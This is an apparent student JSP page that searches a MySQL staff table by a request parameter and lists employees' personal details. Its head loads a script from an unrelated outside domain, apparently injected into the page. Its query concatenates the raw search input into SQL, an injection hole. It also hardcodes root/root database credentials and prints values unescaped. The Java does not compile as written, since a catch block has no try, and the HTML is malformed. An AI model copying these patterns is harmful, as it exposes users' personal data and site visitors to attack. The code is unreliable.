<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
 <%@ page import="java.sql.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Profile</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  
  
  </head>
    <body>
    		<%
  		String user=(String) session.getAttribute("xmail");
  		if(user==null){
  			request.setAttribute("Error","You Must Login First...");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		}
  		%>
	<div class="navbar navbar-default navbar-fixed-top fadeIn animated">
	<div class="container">
		<a class="navbar-brand" href="#">MySite 
		
		</a>
		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="navbar-collapse">
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
		</button>
			<div class="collapse navbar-collapse"> 
				<ul class="nav navbar-nav navbar-right"> 
					<li> <a href="Home.jsp">Home</a></li>
                    <li> <a href="Data.jsp">Data Entry</a></li>
                    <li  class="active"> <a href="Profile.jsp">Data Records</a></li>
                    <li> <a href="#">Reports</a></li>
                    <form class="navbar-form navbar-left" role="search">
					<div class="form-group" method="post">
					<input type="text" class="form-control" name="search" placeholder="search">
					</div>
					<button type="submit" class="btn btn-default">Search       <span class="glyphicon glyphicon-search" area-hidden="true"></span></button>
					</form>
					     			      </div>
								    </div>
								 </div>
								<li> 
							 </div>
						  </div>
						</ul>
					</li>
				</ul>
	          </div> 
			</div>
  		</div>
  		<div class="row"> 
  			<div class="col-lg-12">
  				<div id="MmyCarousel" class="carousel slide" data-ride="carousel">
  <!-- Indicators -->


  <!-- Wrapper for slides -->
  <div class="carousel-inner Imgg">
    <div class="item active">
   <div class="item Imgg">
			      <img src="iWall/Aerial_view_of_graphic_era_university.jpg" alt="Aerial_view_of_graphic_era_university" class="img-responsive">
			      <div class="carousel-caption TXT1">
						<h3>LEARNING MANAGEMENT SYSTEM <br/>
						<h4>For WordPress</h4>
						<h5>Create your own Courses and sell online.</h5>
						<h2>It IS Not just a WordPress Theme.</h2>
			      </div>
			    </div></div>

</div>
<hr>
</div>

<body>
<%
String s=request.getParameter("search");
Class.forName("com.mysql.jdbc.Driver");
Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
String str="select * from staff1 where sid='"+s+"'";
PreparedStatement ps=con.prepareStatement(str);
ResultSet rs=ps.executeQuery();
%>
<div class="container">
<div class="row">
<div class="row jumbotron">
<div class="col-lg-12">
<div class="table-responsive">
<div class="alert alert-info" role="alert">Well done! You successfully read All Records. </div>

<table class="table">
<tr> 
	 <td class="danger"> <h4> Name</h4> </td>
	 <td class="danger"> <h4> DOB</h4> </td>
	 <td class="danger"> <h4> Phone</h4> </td>
	 <td class="danger"> <h4> Gender</h4> </td>
	 <td class="danger"> <h4> Status</h4> </td>
	 <td class="danger"> <h4> Address</h4> </td>
	 <td class="danger"> <h4> Grad</h4> </td>
	 <td class="danger"> <h4> Colg</h4> </td>
	 <td class="danger"> <h4> Year</h4> </td>
	 <td class="danger"> <h4> PG</h4> </td>
	 <td class="danger"> <h4> Colg</h4> </td>
	 <td class="danger"> <h4> Year</h4> </td>
	 <td class="danger"> <h4> Exp</h4> </td>
	 <td class="danger"> <h4> SiD</h4> </td>
	 <td class="danger"> <h4> Dep</h4> </td>
	 <td class="danger"> <h4> Desig</h4> </td>
	 <td class="danger"> <h4> Jod</h4> </td>
	 
			<%
			if(rs.next()) {
			%>
		</tr>
			<td class="warning">  <%=rs.getString("name") %> </td>
			<td class="warning">  <%=rs.getString("dob") %> </td>
			<td class="warning">  <%=rs.getString("fone") %> </td>
			<td class="warning">  <%=rs.getString("gender") %> </td>
			<td class="warning">  <%=rs.getString("status") %> </td>
			<td class="warning">  <%=rs.getString("addr") %> </td>
			<td class="warning">  <%=rs.getString("graduation") %> </td>
			<td class="warning">  <%=rs.getString("colg") %> </td>
			<td class="warning">  <%=rs.getString("year") %> </td>
			<td class="warning">  <%=rs.getString("pg") %> </td>
			<td class="warning">  <%=rs.getString("colg2") %> </td>
			<td class="warning">  <%=rs.getString("year2") %> </td>
			<td class="warning">  <%=rs.getString("exp") %> </td>
			<td class="warning">  <%=rs.getString("sid") %> </td>
			<td class="warning">  <%=rs.getString("dep") %> </td>
			<td class="warning">  <%=rs.getString("desig") %> </td>
			<td class="warning">  <%=rs.getString("jod") %> </td>
			</tr>
			<%
	}
	rs.close();
}catch(Exception e) { out.println(e);
%>
</table>
</div>
</div>
</div>
</div>
</div>

  <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
